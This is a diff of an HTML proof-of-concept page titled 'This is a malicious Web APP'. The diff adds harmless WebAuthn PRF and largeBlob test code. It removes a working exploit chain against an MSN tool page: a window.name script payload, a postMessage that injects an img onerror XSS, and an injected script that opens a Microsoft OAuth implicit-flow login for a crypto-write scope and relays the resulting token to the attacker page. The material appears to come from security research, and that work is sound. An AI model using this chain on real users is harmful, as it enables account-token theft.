@@ -12,21 +12,35 @@
   <main>
     <h1>This is a malicious Web APP</h1>
     <div id="tokenOut"></div>
-    <iframe id="iframe" src="https://www.msn.cn/staticsb/statics/latest/content-tools/aecTool/aecTool.html" style="width:100%;height:100%;border:0" onload="sendPM()" name='<button onclick="go()">go</button><div id="token"></div><script>token=document.getElementById("token");onmessage=function(e){token.textContent="message received in MSN domain: " + e.data.data.result;parent.postMessage(e.data.data.result,"*");
- }
- function go(){
-  window.open(`https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=f78b16b6-0f85-48c0-b19b-fcaa5da5dae2&tenant=common&redirect_uri=https%3A%2F%2Fwebxtsvc.microsoft.com%2Flogin&response_type=token&scope=https://cryptoservicemfa.webxtsvc.microsoft.com/Mainnet.Write&state={"parentOrigin":"https://www.msn.cn"}`,"_blank");
- }
- </script>
- '></iframe>
   </main>
   <script>
-    function sendPM(){
-      iframe.contentWindow.postMessage({"message":"convertAndLoad","json":'"{\\"_locale\\":\\"<img src=x onerror=document.write(window.name)>\\",\\"_id\\":\\"\\"}"'},'*');
-    }
-    onmessage=function(e){
-      tokenOut.textContent="message received in malicious Web App domain: " + e.data;
-    }
+    const firstSalt = new Uint8Array([
+  0x4a, 0x18, 0xa1, 0xe7, 0x4b, 0xfb, 0x3d, 0x3f, 0x2a, 0x5d, 0x1f, 0x0c,
+  0xcc, 0xe3, 0x96, 0x5e, 0x00, 0x61, 0xd1, 0x20, 0x82, 0xdc, 0x2a, 0x65,
+  0x8a, 0x18, 0x10, 0xc0, 0x0f, 0x26, 0xbe, 0x1e,
+]).buffer;
+const publicKey = {
+  challenge: new Uint8Array([117, 61, 252, 231, 191, 241]),
+  rp: { id: "developer.mozilla.org", name: "ACME Corporation" },
+  user: {
+    id: new Uint8Array([79, 252, 83, 72, 214, 7, 89, 26]),
+    name: "jamiedoe",
+    displayName: "Jamie Doe"
+  },
+  pubKeyCredParams: [ {type: "public-key", alg: -7} ],
+  authenticatorSelection: {
+    userVerification: 'required',
+        residentKey: 'required',
+        authenticatorAttachment: 'cross-platform',
+  },
+  extensions: {
+    largeBlob: {
+          support: "preferred",
+        },
+    prf: { eval: { first: firstSalt } }
+  },
+};
+navigator.credentials.create({publicKey}).then((e) => console.log(e.getClientExtensionResults()));
   </script>
 </body>
 
